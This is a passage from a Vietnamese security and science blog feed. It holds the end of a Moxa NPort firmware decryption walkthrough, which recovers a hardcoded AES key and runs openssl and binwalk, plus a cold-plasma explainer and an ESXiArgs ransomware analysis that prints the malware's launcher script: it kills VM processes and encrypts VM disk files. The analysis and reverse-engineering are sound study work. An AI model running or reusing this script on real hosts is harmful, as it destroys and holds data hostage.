</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+=</span> <span style="color:#d19a66">4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;&#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">join</span>(<span style="color:#e5c07b">chr</span>(<span style="color:#e06c75">byte</span>) <span style="color:#c678dd">for</span> <span style="color:#e06c75">byte</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">passwd</span>))
</span></span></code></pre></div><p>Khi mình chạy chương trình Python này, nó sẽ in ra cái này:</p>

    <img src="/img/nport-firmware/nport-firmware-fw_decrypt-python-output.png"  alt="NPort firmware fw_decrypt vòng lặp while trong python"  class="center"  style="padding: 10px"  />


<p>Thế là mình được khóa giải mã AES cho chương trình này là &ldquo;<em>2887Conn7564</em>&rdquo;. Mình có thể sử dụng khóa này để giải mã firmware. Trước hết thì mình cần chuyển khóa này thành mã hex:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;&#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">join</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">byte</span>)[<span style="color:#d19a66">2</span>:] <span style="color:#c678dd">for</span> <span style="color:#e06c75">byte</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">passwd</span>))
</span></span></code></pre></div><p>Dòng này sẽ cho ra kết quả là <em>32383837436f6e6e373536340000</em></p>
<h2 id="giải-mã-phần-mềm">Giải mã phần mềm</h2>
<p>Làm thế nào để mình có thể giải mã firmware này với khóa mình vừa lấy được?</p>
<p>Mình có thể dùng <em>OpenSSL</em>. Câu lệnh <code>openssl</code> có hỗ trợ mã hóa AES 128-bit ở chế độ ECB thế nên mình sẽ sử dụng nó.</p>
<p>Trước khi mình giải mã, khi mà mình dịch ngược hàm <code>ecb128Decrypt</code> và dùng câu lệnh <code>hexdump</code>, mình biết được là firmware đã bị mã hóa này có khoảng <em>0x28</em> byte đệm (40 byte trong số nguyên)</p>
<p>Thế nên mình phải loại bỏ các byte đệm đó, nếu không thì nó sẽ cố giải mã các byte đệm đó, tạo ra dữ liệu xấu. Mình sẽ dùng câu lệnh <code>dd</code> cho việc này:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ dd <span style="color:#c678dd">if</span><span style="color:#56b6c2">=</span>moxa-nport-w2150a-w2250a-series-firmware-v2.2.rom <span style="color:#e06c75">of</span><span style="color:#56b6c2">=</span>firmware-offseted.encrypted <span style="color:#e06c75">bs</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span> <span style="color:#e06c75">skip</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">40</span>
</span></span><span style="display:flex;"><span>8874768+0 records in
</span></span><span style="display:flex;"><span>8874768+0 records out
</span></span><span style="display:flex;"><span><span style="color:#d19a66">8874768</span> bytes transferred in 54.281718 secs <span style="color:#56b6c2">(</span><span style="color:#d19a66">163495</span> bytes/sec<span style="color:#56b6c2">)</span>
</span></span></code></pre></div><blockquote>
<p><strong>Note</strong>: <code>bs</code> có nghĩa là kích cỡ khối, <code>skip</code> có nghĩa là số byte để skip</p></blockquote>
<p>Bây giờ mình có thể dùng <code>openssl</code> để giải mã file <code>firmware-offseted.encrypted</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl aes-128-ecb -d -K <span style="color:#98c379">&#34;32383837436f6e6e373536340000&#34;</span> -in firmware-offseted.encrypted -out firmware.decrypted
</span></span></code></pre></div><p>Câu lệnh này sẽ cho ra file <code>firmware.decrypted</code>. Nếu như mình chạy câu lệnh <code>binwalk</code> lên file đã được giải mã này thì nó sẽ ra:</p>

    <img src="/img/nport-firmware/nport-firmware-firmware-decrypted-openssl.png"  alt="NPort firmware đã được giải mã binwalk"  class="center"  style="padding: 10px"  />


<p>Mình sẽ giải nén file này ra <code>_firmware.decrypted.extracted</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk -e firmware.decrypted
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">cd</span> _firmware.decrypted.extracted
</span></span></code></pre></div><p>Cho các folder <code>squashfs-root</code> quyền thực thi:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x -R squashfs-root*
</span></span></code></pre></div><p>Và thế là mình có quyền truy cập vào firmware phiên bản <em>2.2</em> của thiết bị này:</p>

    <img src="/img/nport-firmware/nport-firmware-firmware-decrypted-filesystem.png"  alt="NPort firmware hệ thống file đã được giải mã"  class="center"  style="padding: 10px"  />


<h2 id="kết-luận">Kết luận</h2>
<p>Đó là cách mình dịch ngược và giải mã 1 firmware đã được mã hóa. Mình học được nhiều về cách phân tích firmware để tìm ra lỗ hổng và cách tấn công các lỗ hổng đó.</p>
]]></content>
        </item>
        
        <item>
            <title>Lửa! Nhưng nó lạnh</title>
            <link>https://namberino.github.io/vi/posts/2024/04/l%E1%BB%ADa-nh%C6%B0ng-n%C3%B3-l%E1%BA%A1nh/</link>
            <pubDate>Thu, 18 Apr 2024 20:57:47 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2024/04/l%E1%BB%ADa-nh%C6%B0ng-n%C3%B3-l%E1%BA%A1nh/</guid>
            <description>&lt;p&gt;Gần đây mình xem youtube có thấy 1 vài thí nghiệm về 1 thứ gọi là &lt;em&gt;&amp;ldquo;lửa lạnh&amp;rdquo;&lt;/em&gt;. Nó nghe rất nghịch lý. Làm thế nào mà lửa, 1 thứ nóng, lại có thể trở nên lạnh được? Đó là điều mình sẽ khám phá trong bài blog này.&lt;/p&gt;
&lt;h2 id=&#34;lửa-là-gì&#34;&gt;Lửa là gì?&lt;/h2&gt;
&lt;p&gt;Để có thể hiểu được lửa là gì, chúng ta cần hiểu &lt;strong&gt;plasma&lt;/strong&gt; là gì. Plasma là trạng thái vật chất thứ 4, ngay sau khí. Khi mà khí trở nên cực nóng, các hạt electron trong chất khí đó có đủ năng lượng để tách khỏi nguyên tử của chúng và chuyển động tự do. Các hạt nguyên tử sẽ trở nên tích điện do chúng thiếu electron và chúng tạo ra 1 khối các nguyên tử tích điện.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Gần đây mình xem youtube có thấy 1 vài thí nghiệm về 1 thứ gọi là <em>&ldquo;lửa lạnh&rdquo;</em>. Nó nghe rất nghịch lý. Làm thế nào mà lửa, 1 thứ nóng, lại có thể trở nên lạnh được? Đó là điều mình sẽ khám phá trong bài blog này.</p>
<h2 id="lửa-là-gì">Lửa là gì?</h2>
<p>Để có thể hiểu được lửa là gì, chúng ta cần hiểu <strong>plasma</strong> là gì. Plasma là trạng thái vật chất thứ 4, ngay sau khí. Khi mà khí trở nên cực nóng, các hạt electron trong chất khí đó có đủ năng lượng để tách khỏi nguyên tử của chúng và chuyển động tự do. Các hạt nguyên tử sẽ trở nên tích điện do chúng thiếu electron và chúng tạo ra 1 khối các nguyên tử tích điện.</p>
<p>Lửa được coi là <strong>plasma 1 phần</strong> bởi vì lửa có độ ion hóa khá thấp do nó có số lượng nguyên tử ion khá thấp so với số lượng nguyên tử trong khí bị đốt. Mặc dù lửa được coi là plasma hạng thấp so với 1 thứ khác như là sấm chớp, nó vẫn có nhiệt độ khá cao.</p>
<p>1 concept rất quan trọng về plasma là plasma có 2 set nhiệt độ:</p>
<ul>
<li>Nhiệt độ electron</li>
<li>Nhiệt độ ion/nguyên tử</li>
</ul>
<p>Bởi vì lửa được châm bằng phương thức sinh ra nhiều năng lượng, nguyên tử trong phản ứng sẽ trở nên rất nóng và các electron sẽ bắt đầu tách rời và di chuyển. Điều này thường xảy ra trong đa số plasma. Nếu như mình cho thêm năng lượng vào plasma, nhiệt độ của các hạt nguyên tử sẽ tăng lên. Đây được gọi là plasma nóng (tên khoa học của nó là &ldquo;Plasma cân bằng&rdquo; bởi vì nhiệt độ của nguyên tử và electrong bằng nhau).</p>

    <img src="/img/cold-fire/match-fire.jpg"  alt="Plasma trên diêm"  class="center"  style="padding: 10px"  />


<p>Nhưng đây không phải lựa chọn làm plasma duy nhất. Nếu như mình tích đủ năng lượng để có thể làm nóng electron và giữ nguyên tử lạnh thì mình sẽ có plasma với nhiệt độ electron ở khoảng <em>3 - 15</em> nghìn độ. Đây được gọi là plasma lạnh (tên khoa học của nó là &ldquo;Plasma không cân bằng&rdquo; bởi vì các hạt nguyên tử ở nhiệt độ thấp hơn nhiều so với các hạt electron. Độ chênh lệch này sẽ làm giảm nhiệt độ trung bình của plasma). Nếu như mình chạm vào plasma này thì nó sẽ cảm thấy lạnh thay vì nóng bởi vì các hạt electron có trọng lượng quá nhỏ để động năng của chúng có thể truyền nhiệt tới vật lớn hơn.</p>
<p>Đó là lý do vì sao mà chạm vào plasma lạnh sẽ không làm hại mình</p>

    <img src="/img/cold-fire/cold-plasma-finger.jpg"  alt="Ngón tay chạm vào plasma lạnh"  class="center"  style="padding: 10px"  />


<h2 id="cách-plasma-lạnh-được-tạo-ra">Cách plasma lạnh được tạo ra</h2>
<p>Với kiến thức về plasma và plasma lạnh, làm thế nào để mình có thể tạo ra plasma lạnh?</p>
<p>Những người đã nghịch với điện cao thế sẽ biết là nguồn có hiệu điện thế cao sẽ cho phép mình kéo 1 dòng plasma ra khi mà mình cho dây điện đến đủ gần. Nếu như bạn chưa thấy cái này bao giờ thì có thể xem <a href="https://youtu.be/m7VP36diOKY?si=Bape72WkVFGqrr1b&amp;t=132">video này</a></p>
<p>Điều này xảy ra bởi vì các hạt electron trong dây dẫn điện có đủ năng lượng để nhảy ra khỏi dây dẫn qua 1 khoảng khá xa tới dây tiếp địa để giải tỏa năng lượng. Khi mà dây dẫn đến gần nhau, các hạt electron có đủ năng lượng để nhảy qua khoảng cách nhỏ hơn, hiện tượng này sẽ làm ion hóa các phân tử của không khí xung quanh dây dẫn, cho phép nhiều electron nhảy qua hơn. Hiện tượng này làm phân tử không khí đã bị ion hóa có thể dẫn điện được bởi vì các hạt electron của không khí bị &ldquo;knock&rdquo; ra ngoài, việc này cho phép các hạt electron từ dây điện có thể đi qua các vùng không khí bị ion hóa này dễ dàng hơn. Càng nhiều hạt electron, không khí càng bị ion hóa, và điều này sẽ làm mọi thứ xung quanh trở nên nóng hơn.</p>
<p>Chúng ta có thể sử dụng hiện tượng này để tạo ra 1 dòng plasma ổn định. Chúng ta có thể làm nó ổn định hơn bằng cách tăng hiệu điện thế như điều đó khá nguy hiểm và tốn nhiều năng lượng, thế nên thay vì làm thế, chúng ta có thể tăng tần số của dòng điện xoay chiều để có thể tạo ra plasma ổn định hơn (tần số của dòng điện xoay chiều nên ở trong vùng radio tần số thấp)</p>
<p>1 bộ biến áp của lò vi sóng chạy bằng điện từ đường dây điện của thành phố chạy ở khoảng <em>60Hz</em> (60 lần/giây). Khoảng cách các hạt electron có thể nhảy có tỉ lệ thuận với hiệu điện thế và 60Hz sẽ tạo ra khoảng thời gian chờ lớn hơn giữa các đỉnh hiệu điện thế của dòng điện xoay chiều. Các đỉnh của dòng điện xoay chiều là các khoảng thời gian mà các hạt electron có nhiều năng lượng nhất và có thể nhảy xa nhất. Bằng các tăng tần số, dòng điện xoay chiều sẽ có thời gian đợi giữa các đỉnh ngắn hơn, có nhiều lần các hạt electron có thể nhảy với nhiều năng lượng nhất.</p>
<p>Hiện tượng này được gọi là <em>&ldquo;Hiệu ứng trường xa&rdquo;</em>. Nếu như mình tăng tần số lên tầm tần số radio thấp, dây dẫn sẽ bắt đầu tạo các sóng radio mà có thể tiếp thêm năng lượng cho các hạt electron. Càng nhiều năng lượng thì electron càng nhảy xa.</p>
<p>Để làm plasma lạnh, mình có thể tận dụng hiện tượng này bằng cách điều hướng các hạt electron qua 1 ống cách điện. Ống cách điện này cũng sẽ có chứa khí dễ bị ion hóa như là heli hoặc argon. Các hạt electron có thể dễ dàng ion hóa khí này và biến nó thành plasma.</p>
<p>Bởi vì không có đủ năng lượng để làm nóng các hạt nguyên tử trong khí trong thời gian ngắn, các hạt electron sẽ hấp thụ đa số năng lượng đó và tạo ra plasma lạnh.</p>
<h2 id="tại-sao-lại-cần-plasma-lạnh">Tại sao lại cần plasma lạnh?</h2>
<p>Plasma lạnh có 1 vài công dụng rất hữu ích:</p>
<ul>
<li>Plasma lạnh có chứa rất nhiều các hạt tích điện dễ phản ứng. Những hạt này có thể nhanh chóng tiêu diệt các vi sinh vật. Tức là plasma lạnh có thể được dùng để sát trùng mà không làm ảnh hưởng đến thứ đang bị sát trùng</li>
<li>Các hạt dễ phán ứng này có thể được sử dụng trong hóa học cho nhiều việc khác nhau (như là tách các chất hóa học)</li>
<li>Nó hay.</li>
</ul>
<h2 id="tự-làm-plasma-lạnh">Tự làm plasma lạnh</h2>
<blockquote>
<p><strong>Lưu ý</strong>: Làm việc với hiệu điện thế cao sẽ <strong>RẤT</strong> nguy hiểm. Nếu như không có kinh nghiệm với hiệu điện thế cao thì <strong>ĐỪNG THỬ LÀM</strong>. Nếu như làm thì hãy cẩn thận và chuẩn bị kĩ càng.</p></blockquote>
<p>Với 1 biến áp có thể tạo ra hiệu điện thế cao với tần số cao, ống cách điện và bình khí với khí có thể bị ion hóa dễ dàng, mình có thể tạo ra plasma lạnh. Bạn có thể xem video này để có thể biết cách làm plasma lạnh:</p>
<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/wOV8kliF4eo?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
    </div>

]]></content>
        </item>
        
        <item>
            <title>Phân tích mã độc ESXiArgs</title>
            <link>https://namberino.github.io/vi/posts/2024/04/ph%C3%A2n-t%C3%ADch-m%C3%A3-%C4%91%E1%BB%99c-esxiargs/</link>
            <pubDate>Mon, 01 Apr 2024 14:42:54 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2024/04/ph%C3%A2n-t%C3%ADch-m%C3%A3-%C4%91%E1%BB%99c-esxiargs/</guid>
            <description>&lt;p&gt;Năm vừa qua có xảy ra 1 vụ tấn công ransomware gọi là &lt;strong&gt;ESXiArgs&lt;/strong&gt;. Vũ tấn công này đã làm mã hóa hàng trăm các máy ảo VMware khác nhau. Và mình quyết định là sẽ thử sức dịch ngược và phân tích mã độc này để xem nó hoạt động thế nào.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Note: Mẫu mã độc này được lấy từ &lt;a href=&#34;https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14#entry5470686&#34;&gt;forum bleepingcomputer&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;script-chạy&#34;&gt;Script chạy&lt;/h1&gt;
&lt;p&gt;Mình sẽ bắt đầu bằng phân tích script chạy mã đọc trước:&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Năm vừa qua có xảy ra 1 vụ tấn công ransomware gọi là <strong>ESXiArgs</strong>. Vũ tấn công này đã làm mã hóa hàng trăm các máy ảo VMware khác nhau. Và mình quyết định là sẽ thử sức dịch ngược và phân tích mã độc này để xem nó hoạt động thế nào.</p>
<blockquote>
<p>Note: Mẫu mã độc này được lấy từ <a href="https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14#entry5470686">forum bleepingcomputer</a></p></blockquote>
<h1 id="script-chạy">Script chạy</h1>
<p>Mình sẽ bắt đầu bằng phân tích script chạy mã đọc trước:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#7f848e">## CHANGE CONFIG</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> config_file in <span style="color:#c678dd">$(</span>esxcli vm process list | grep <span style="color:#98c379">&#34;Config File&#34;</span> | awk <span style="color:#98c379">&#39;{print $3}&#39;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;FIND CONFIG: </span><span style="color:#e06c75">$config_file</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span>  sed -i -e <span style="color:#98c379">&#39;s/.vmdk/1.vmdk/g&#39;</span> -e <span style="color:#98c379">&#39;s/.vswp/1.vswp/g&#39;</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$config_file</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">done</span>
</span></span></code></pre></div><p>Đoạn code này sẽ tìm các file config và đổi các file <code>vmdk</code> sang file <code>vswp</code>. Ở đây cũng ko có gì quá thú vị về mặt phân tích.</p>
<p>Trong đoạn tiếp theo, script này sẽ dừng quá trình tên là <code>VMX</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#7f848e">## STOP VMX</span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;KILL VMX&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">kill</span> -9 <span style="color:#c678dd">$(</span>ps | grep vmx | awk <span style="color:#98c379">&#39;{print $2}&#39;</span><span style="color:#c678dd">)</span>
</span></span></code></pre></div><p>Quá trình <code>VMX</code> là quá trình quản lý các thiết bị I/O (Input/Output). Nó cũng hỗ trợ việc giao tiếp giữa interface người dùng, quản lý snapshot của máy ảo và console remote</p>
<p>Đoạn tiếp theo của script là đoạn <em>mã hóa</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#7f848e">## ENCRYPT</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>chmod +x <span style="color:#e06c75">$CLEAN_DIR</span>/encrypt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> volume in <span style="color:#c678dd">$(</span><span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;\n&#39;</span> esxcli storage filesystem list | grep <span style="color:#98c379">&#34;/vmfs/volumes/&#34;</span> | awk -F<span style="color:#98c379">&#39;  &#39;</span> <span style="color:#98c379">&#39;{print $2}&#39;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;START VOLUME: </span><span style="color:#e06c75">$volume</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">$&#39;\n&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">for</span> file_e in <span style="color:#c678dd">$(</span> find <span style="color:#98c379">&#34;/vmfs/volumes/</span><span style="color:#e06c75">$volume</span><span style="color:#98c379">/&#34;</span> -type f -name <span style="color:#98c379">&#34;*.vmdk&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmx&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmxf&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsd&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsn&#34;</span> -o -name <span style="color:#98c379">&#34;*.vswp&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmss&#34;</span> -o -name <span style="color:#98c379">&#34;*.nvram&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmem&#34;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> -f <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$(</span>du -k <span style="color:#e06c75">$file_e</span> | awk <span style="color:#98c379">&#39;{print $1}&#39;</span><span style="color:#c678dd">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#e06c75">$size_kb</span> -eq <span style="color:#d19a66">0</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#c678dd">$((</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#c678dd">))</span> -gt <span style="color:#d19a66">128</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$((</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">100</span><span style="color:#56b6c2">)-</span><span style="color:#d19a66">1</span><span style="color:#c678dd">))</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;START ENCRYPT: </span><span style="color:#e06c75">$file_e</span><span style="color:#98c379"> SIZE: </span><span style="color:#e06c75">$size_kb</span><span style="color:#98c379"> STEP SIZE: </span><span style="color:#e06c75">$size_step</span><span style="color:#98c379">&#34;</span> <span style="color:#98c379">&#34;\&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">\&#34; </span><span style="color:#e06c75">$size_step</span><span style="color:#98c379"> 1 </span><span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">echo</span> <span style="color:#e06c75">$size_step</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span> &gt; <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">.args&#34;</span>
</span></span><span style="display:flex;"><span>        nohup <span style="color:#e06c75">$CLEAN_DIR</span>/encrypt <span style="color:#e06c75">$CLEAN_DIR</span>/public.pem <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#e06c75">$size_step</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span> &gt;/dev/null 2&gt;&amp;1&amp;
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">done</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">$&#34; &#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">done</span>
</span></span></code></pre></div><p>Phân tích đoạn này nào:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#c678dd">for</span> volume in <span style="color:#c678dd">$(</span><span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;\n&#39;</span> esxcli storage filesystem list | grep <span style="color:#98c379">&#34;/vmfs/volumes/&#34;</span> | awk -F<span style="color:#98c379">&#39;  &#39;</span> <span style="color:#98c379">&#39;{print $2}&#39;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span></code></pre></div><p>Vòng lặp đầu tiên sẽ đi qua các cái volume trong folder <code>/vmfs/volumes/</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#c678dd">for</span> file_e in <span style="color:#c678dd">$(</span> find <span style="color:#98c379">&#34;/vmfs/volumes/</span><span style="color:#e06c75">$volume</span><span style="color:#98c379">/&#34;</span> -type f -name <span style="color:#98c379">&#34;*.vmdk&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmx&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmxf&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsd&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsn&#34;</span> -o -name <span style="color:#98c379">&#34;*.vswp&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmss&#34;</span> -o -name <span style="color:#98c379">&#34;*.nvram&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmem&#34;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span></code></pre></div><p>Vòng lặp thứ 2 sẽ tìm các file trong các volume đó với các đuôi sau:</p>
<ul>
<li><code>.vmdk</code></li>
<li><code>.vmx</code></li>
<li><code>.vmxf</code></li>
<li><code>.vmsd</code></li>
<li><code>.vmsn</code></li>
<li><code>.vswp</code></li>
<li><code>.vmss</code></li>
<li><code>.nvram</code></li>
<li><code>.vmem</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> -f <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$(</span>du -k <span style="color:#e06c75">$file_e</span> | awk <span style="color:#98c379">&#39;{print $1}&#39;</span><span style="color:#c678dd">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#e06c75">$size_kb</span> -eq <span style="color:#d19a66">0</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#c678dd">$((</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#c678dd">))</span> -gt <span style="color:#d19a66">128</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$((</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">100</span><span style="color:#56b6c2">)-</span><span style="color:#d19a66">1</span><span style="color:#c678dd">))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">fi</span>
</span></span></code></pre></div><p>Đoạn này của script sẽ tính kích cỡ của các file tìm được trong vòng lặp thứ 2. Số bước để mã hóa file (số MB để skip) sẽ được suy ra từ kích cỡ của file.</p>
